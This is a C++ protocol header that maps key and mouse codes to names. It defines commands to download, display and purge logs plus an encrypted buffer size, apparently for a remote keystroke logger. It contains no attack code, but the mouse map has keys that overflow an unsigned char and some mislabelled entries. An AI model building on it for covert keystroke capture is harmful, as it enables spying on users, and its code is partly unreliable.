#ifndef _PROTOCOL_HPP_
#define _PROTOCOL_HPP_

////////////////////////////////////
//        C++11 OBLIGATOIRE       //
////////////////////////////////////

#include <map>

static std::map<unsigned char, std::string> m_keycode2name = {
	{ 0, "unknown" },
	{ 0x01, "left mouse button" },{ 0x02, "right mouse button" },
	{ 0x03, "Control-break processing" },{ 0x04, "Middle mouse button" },
	{ 0x05, "X1 mouse button" },{ 0x06, "X2 mouse button" },
	{ 0x07, "Unknown button" },{ 0x08, "BACKSPACE" },
	{ 0x09, "TAB" },{ 0x0A, "Unknown button" },{ 0x0B, "Unknown button" },{ 0x0C, "CLEAR" },
	{ 0x0D, "ENTER" },{ 0x0E, "Unknown button" },{ 0x0F, "Unknown button" },
	{ 0x10, "SHIFT" },{ 0x11, "CTRL" },{ 0x12, "ALT" },{ 0x13, "PAUSE" },
	{ 0x14, "CAPS LOCK" },{ 0x15, "IME Kana mode" },{ 0x16, "Undefined button" },{ 0x17, "IME Junja mode" },
	{ 0x18, "IME final mode" },{ 0x19, "IME Hanja mode" },{ 0x1A, "Undefined button" },{ 0x1B, "ESC" },
	{ 0x1C, "IME convert" },{ 0x1D, "IME nonconvert" },{ 0x1E, "IME accept" },{ 0x1F, "IME mode change request" },{ 0x20, "SPACEBAR" },{ 0x21, "PAGE UP" },
	{ 0x22, "PAGE DOWN" },{ 0x23, "END" },{ 0x24, "HOME" },{ 0x25, "LEFT ARROW" },{ 0x26, "UP ARROW" },{ 0x27, "RIGHT ARROW" },{ 0x28, "DOWN ARROW" },
	{ 0x29, "SELECT" },{ 0x2A, "PRINT" },{ 0x2B, "EXECUTE" },{ 0x2C, "PRINT SCREEN" },{ 0x2D, "INS" },{ 0x2E, "DEL" },{ 0x2F, "HELP" },
	{ 0x30, "0" },{ 0x31, "1" },{ 0x32, "2" },{ 0x33, "3" },{ 0x34, "4" },{ 0x35, "5" },{ 0x36, "6" },{ 0x37, "7" },{ 0x38, "8" },{ 0x39, "9" },
	//0x3A-40 -> Undefined
	{ 0x41, "A" },{ 0x42, "B" },{ 0x43, "C" },
	{ 0x44, "D" },{ 0x45, "E" },{ 0x46, "F" },
	{ 0x47, "G" },{ 0x48, "H" },{ 0x49, "I" },
	{ 0x4A, "J" },{ 0x4B, "K" },{ 0x4C, "L" },
	{ 0x4D, "M" },{ 0x4E, "N" },{ 0x4F, "O" },
	{ 0x50, "P" },{ 0x51, "Q" },{ 0x52, "R" },
	{ 0x53, "S" },{ 0x54, "T" },{ 0x55, "U" },
	{ 0x56, "V" },{ 0x57, "W" },{ 0x58, "X" },
	{ 0x59, "Y" },{ 0x5A, "Z" },{ 0x5B, "LEFT WINDOWS" },{ 0x5C, "RIGHT WINDOWS" },{ 0x5D, "APPLICATION" },
	{ 0x5F, "SLEEP" },{ 0x60, "NUMPAD 0" },{ 0x61, "NUMPAD 1" },{ 0x62, "NUMPAD 2" },{ 0x63, "NUMPAD 3" },{ 0x64, "NUMPAD 4" },
	{ 0x65, "NUMPAD 5" },{ 0x66, "NUMPAD 6" },{ 0x67, "NUMPAD 7" },{ 0x68, "NUMPAD 8" },{ 0x69, "NUMPAD 9" },{ 0x6A, "MULTIPLY" },
	{ 0x6B, "ADD" },{ 0x6C, "SEPARATOR" },{ 0x6D, "SUBSTRACT" },{ 0x6E, "DECIMAL" },{ 0x6F, "DIVIDE" },{ 0x70, "F1" },
	{ 0x71, "F2" },{ 0x72, "F3" },{ 0x73, "F4" },{ 0x74, "F5" },{ 0x75, "F6" },{ 0x76, "F7" },{ 0x77, "F8" },{ 0x78, "F9" },{ 0x79, "F10" },
	{ 0x7A, "F11" },{ 0x7B, "F12" },{ 0x7C, "F13" },{ 0x7D, "F14" },{ 0x7E, "F15" },{ 0x7F, "F16" },{ 0x80, "F17" },{ 0x81, "F18" },{ 0x82, "F19" },
	{ 0x83, "F20" },{ 0x84, "F21" },{ 0x85, "F22" },{ 0x86, "F23" },{ 0x87, "F24" },
	{ 0x90, "NUM LOCK" },{ 0x91, "SCROLL LOCK" },{ 0x92, "SCROLL LOCK" },{ 0x93, "OEM SPECIFIC" },{ 0x94, "OEM SPECIFIC" },{ 0x95, "OEM SPECIFIC" },{ 0x96, "OEM SPECIFIC" },
	{ 0xA0, "LEFT SHIFT" },{ 0xA1, "RIGHT SHIFT" },{ 0xA2, "LEFT CONTROL" },{ 0xA3, "RIGHT CONTROL" },{ 0xA4, "LEFT MENU" },{ 0xA5, "RIGHT MENU" },{ 0xA6, "BROWSER BACK" },{ 0xA7, "BROWSER FORWARD" },{ 0xA8, "BROWSER REFRESH" },{ 0xA9, "BROWSER STOP" },
	{ 0xAA, "BROWSER SEARCH" },{ 0xAB, "BROWSER FAVORITES" },{ 0xAC, "BROWSER START AND HOME" },{ 0xAD, "VOLUME MUTE" },{ 0xAE, "VOLUME DOWN" },{ 0xAF, "VOLUME UP" },{ 0xB0, "NEXT TRACK" },
	{ 0xB1, "PREVIOUS TRACK" },{ 0xB2, "STOP MEDIA" },{ 0xB3, "PLAY/PAUSE MEDIA" },{ 0xB4, "START MAIL" },{ 0xB5, "SELECT MEDIA" },{ 0xB6, "START APPLICATION 1" },{ 0xB7, "START APPLICATION 2" },
	{ 0xE5, "IME PROCESS" },{ 0xF6, "ATTN" },{ 0xF7, "CRSEL" },{ 0xF8, "EXSEL" },{ 0xF9, "ERASE EOF" },{ 0xFA, "PLAY" },{ 0xFB, "ZOOM" },{ 0xFD, "PA1" },{ 0xFE, "CLEAR" }
};

static std::map<unsigned char, std::string> m_mousecode2name = {
	{ 0x0202, "Left button up" },
	{ 0x0201, "Left button down" },
	{ 0x0205, "Right button up" },
	{ 0x0204, "Right button down" },
};

const unsigned int buffer_size = 255;

enum commandType { BAD = 0, CLOSE, DOWNLOAD_LOG, DOWNLOAD_LOG_END, DISPLAY_LOG, DISPLAY_LOG_END, PURGE_LOG };

typedef struct      s_cmd
{
	commandType		cmd;
	char			buffer[buffer_size];
	unsigned char	data_len;
}					t_cmd;

const unsigned int cyphered_size = 272;

#endif /* !_PROTOCOL_HPP_ */